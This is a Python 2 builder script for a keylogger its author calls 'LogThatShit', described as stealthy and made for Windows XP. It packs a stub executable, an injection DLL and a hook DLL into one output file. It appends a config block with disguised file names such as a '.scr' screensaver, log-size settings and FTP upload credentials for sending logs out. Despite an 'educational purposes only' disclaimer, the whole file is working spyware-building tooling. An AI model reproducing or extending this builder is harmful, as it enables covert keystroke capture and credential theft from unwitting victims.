# LogThatShit nub-friendly UI
#		A stealthly keylogger designed on and for Windows XP 
#		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> http://biodegradablegeek.com
#
# This software file (the "File") is distributed under the terms of the 
# GNU General Public License Version 3, (the "License"). You may use, 
# redistribute and/or modify this File in accordance with the terms and 
# conditions of the License, a copy of which is available along with the 
# File in the license.txt file or by writing to 
# # Free Software Foundation, Inc., 
# # 59 Temple Place, 
# # Suite 330, Boston, MA, 02111-1307 
# # 
# # or on the Internet at http://www.gnu.org/licenses/gpl.txt.
#
# THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
# DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
# FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
# RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
# FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
# WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.
#
#
# Check FTP settings 
# Make sure all slashes are \\ NOT / 
# Set defautl values for shit 
# Do not allow special characters in alias 


import sys 
import os 
import struct 


LogFocusTitle = 1 
LogTitleChange = 2 
LogFocusPath = 4 
LogFocusTimeStamp = 8 


if __name__=='__main__': 
	# Read settings from file 
	print '* Reading settings from okl.ini' 

	output = 'LogThatShit_py.exe' 
	vanilla = 'Stub.lts' 
	injectdll = 'Injection.dll' 
	hookdll = 'Hook.dll' 

	bdict = {} 
	bdict['ALIAS'] = 'Roger' 
	bdict['PATH'] = 'C:\\' 
	bdict['FILENAME'] = '_OKL_betaY.scr' 
	bdict['LOGNAME'] = '_CCCY.log' 
	bdict['INJECTNAME'] = '_SolutionY.dll' 
	bdict['HOOKNAME'] = '_HookaY.dll' 

	bdict['EXEC'] = 'exec.exe' 
	bdict['REMOVE'] = 'remove.me.now' 
	bdict['UPDATE'] = 'update.exe' 

	bdict['MAXLOGSIZE'] = '10000' 
	bdict['LOGCHECKINT'] = '30' 

	bdict['ROOT'] = '/www/dir' 
	bdict['HOST'] = 'host' 
	bdict['USER'] = 'user' 
	bdict['PASS'] = 'pass' 

	# Read flags 
	flags = 0 
	flags |= LogFocusTitle 
	flags |= LogTitleChange 
	flags |= LogFocusPath 
	flags |= LogFocusTimeStamp 

	# Generate stub 
	print '* Opening stub for output' 
	fp = file(output, 'wb') 

	print '* Writing plain OKL executable' 
	f = file(vanilla, 'rb') 
	sz = os.path.getsize(vanilla) 
	fp.write(f.read(sz)) 
	f.close() 

	print '* Writing injection DLL' 
	f = file(injectdll, 'rb') 
	isz = os.path.getsize(injectdll) 
	fp.write(f.read(isz)) 
	f.close() 

	print '* Writing hook DLL' 
	f = file(hookdll, 'rb') 
	hsz = os.path.getsize(hookdll) 
	fp.write(f.read(hsz)) 
	f.close() 

	# Write block 
	print '* Writing key/value block' 
	block = '' 
	for k,v in bdict.items(): 
		block = block + '%s=%s\0' % (k, v) 
	fp.write(block) 

	# Write settings 
	print '* Writing data struct' 
	fp.write(struct.pack('IIII', flags, isz, hsz, len(block))) 

	# Write sig 
	print '* Finalizing...', 
	fp.write('OKL') 
	fp.close() 

	print 'Success!' 
	print 'Output file:', output 
	print '-------------------------------------' 
	print 'Flags     : %5u' % flags 
	print 'Inject DLL: %5u' % isz 
	print 'Hook DLL  : %5u' % hsz 
	print 'Block     : %5u' % len(block) 
	print 'Output    : %5u' % os.path.getsize(output) 
	print '-------------------------------------' 


